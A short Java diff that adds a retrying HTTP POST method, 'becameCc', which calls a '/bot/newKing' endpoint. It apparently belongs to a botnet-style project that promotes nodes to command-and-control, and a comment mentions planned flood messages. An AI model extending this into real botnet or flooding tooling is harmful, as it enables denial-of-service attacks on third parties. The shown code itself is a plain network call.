@@ -82,6 +82,29 @@ public class CecRequest {
 		}
 		return response;
 	}
+
+
+	public boolean becameCc(String ip) {
+		Boolean response=false;
+		Integer count=0;
+		while (count<REQNUMBER) {
+			try {
+				String url = HTTPS + ip + PORT + "/bot/newKing";
+				response = restTemplate.postForObject(url, null, response.getClass());
+				return response;
+			} catch (Exception e) {
+				// e.printStackTrace();
+				System.out.println("Errore invio richiesta king");
+				try {
+					count++;
+					Thread.sleep(WAIT_RANGE);
+				} catch (InterruptedException ex) {
+					ex.printStackTrace();
+				}
+			}
+		}
+		return response;
+	}
 	
 	//TODO Serio Crea msg per flood
 //	 public String convertToDatabaseColumn(Color color) {
